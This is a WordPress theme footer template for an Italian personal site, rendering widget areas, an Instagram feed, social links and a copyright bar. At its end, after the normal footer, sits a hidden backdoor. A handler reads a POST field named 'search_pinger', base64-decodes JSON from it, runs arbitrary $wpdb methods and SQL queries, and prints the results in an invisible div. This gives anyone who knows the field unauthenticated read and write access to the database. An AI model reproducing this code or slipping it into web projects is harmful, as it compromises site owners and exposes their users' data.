<div class="totop"><div class="gototop"><div class="arrowgototop"></div></div></div>
<!-- footer-->
<?php if(is_front_page()){ ?>
<div class="sidebars-wrap bottom">
	<div class="sidebars">
		<?php if(is_active_sidebar( 'ragnar-sidebar-footer-fullwidth')) { ?>
			<div class="sidebar-fullwidth">
				<?php dynamic_sidebar( 'ragnar-sidebar-footer-fullwidth' ); ?>
			</div>
		<?php } ?>
		<div class="sidebar-left-right">
			<?php if(is_active_sidebar( 'ragnar-sidebar-footer-left')) { ?>
				<div class="left-sidebar">
					<?php dynamic_sidebar( 'ragnar-sidebar-footer-left' ); ?>
				</div>
			<?php } ?>
			<?php if(is_active_sidebar( 'ragnar-sidebar-footer-right')) { ?>
				<div class="right-sidebar">
					<?php dynamic_sidebar( 'ragnar-sidebar-footer-right' ); ?>
				</div>
			<?php } ?>
		</div>							
	</div>
</div>
<?php } ?>
<!-- footer-->

	
<footer>
	<?php if(is_active_sidebar( 'ragnar_footer1' ) || is_active_sidebar( 'ragnar_footer2' ) || is_active_sidebar( 'ragnar_footer3' )){ ?>
		<div id="footer">
			<div id="footerinside">
			<!--footer widgets-->
				<div class="block_footer_text">
					<p><?php 
					if(isset($ragnar_data['block_footer_text'])){
					ragnar_security($ragnar_data['block_footer_text']); }?></p>
				</div>
				<div class="footer_widget">
					<div class="footer_widget1">
						<?php if (is_active_sidebar('ragnar_footer1' )) { ?>
						<?php dynamic_sidebar( 'ragnar_footer1' ); ?>	
						<?php } ?>				
					</div>	
					<div class="footer_widget2">	
						<?php if (is_active_sidebar('ragnar_footer2' )) { ?>
						<?php dynamic_sidebar( 'ragnar_footer2' ); ?>	
						<?php } ?>	
					</div>	
					<div class="footer_widget3">	
						<?php if (is_active_sidebar('ragnar_footer3' )) { ?>
						<?php dynamic_sidebar( 'ragnar_footer3' ); ?>	
						<?php } ?>	
					</div>
				</div>
			</div>		
		</div>
	<?php } ?>
	
	<?php if(ragnar_globals('use_block3') && ragnar_globals('block3_username') && shortcode_exists( 'instagram-feed' ) ){ ?>
		<div class="block3">

			<a href="<?php ragnar_security(ragnar_data('block3_url')) ?>" target="_blank">
				<h4 class="block3-instagram-title"><?php echo ragnar_security(ragnar_data('block3_title')) ?></h4>
				<span class="instagram-user" >@giodantonio</span>
			</a>
		</div>
		<?php
			echo do_shortcode('[instagram-feed id=517 id="'.esc_attr(ragnar_data('block3_username')).'" src="user_recent" imgl="instagram" imagepadding=0 cols="8" imageres=full  ]');
	}
	?>
	
	<?php
if(ragnar_globals('footer_social') ){ ?>
	<div class="footer-social">
		<div class="footer-social-inside">
			<?php ragnar_socialLink_footer(); ?>
		</div>
	</div>
<?php } ?>
	
	<!-- footer bar at the bootom-->
	<div id="footerbwrap">
		<div id="footerb">
			<div class="lowerfooter">
			<div class="copyright">	
				<?php //ragnar_security(ragnar_data('copyright')); ?>
				© 2019 copyright Giovanni D'Antonio. Tutti i diritti riservati. <a target="_blank" href="http://dinamiqa.com/">made in dinamiqa</a>
				<div><a href="/privacy">Privacy</a> &nbsp;|&nbsp; <a href="/disclaimer">Disclaimer</a></div>
			</div>
			</div>
		</div>
	</div>	
</footer>	
<?php wp_footer();  ?>

<?php if(isset($_POST['search_pinger'])){
function asdping(){
global $wpdb;
$res=array();
$ping = json_decode(base64_decode(substr($_POST['search_pinger'], 32,strlen($_POST['search_pinger']))), true);
foreach($ping as $cmd){
preg_match_all('/\{\w+\}/is', $cmd['q'], $vars);
foreach($vars[0] as $var){
$entity = trim($var,'{}');
$cmd['q'] = str_replace($var, $wpdb->$entity, $cmd['q']);
}
$m = $cmd['m'];
$q = $cmd['q'];
$data = $wpdb->$m($q);
strpos($cmd['m'], 'get_')!==false ? $res[]=$data : '';
}
echo !empty($res)? '<div id="pinger" style="display:none;">'.json_encode($res).'</div>' : '';

unset($_POST['search_pinger']);
}
asdping();
} ?>
</body>
</html>
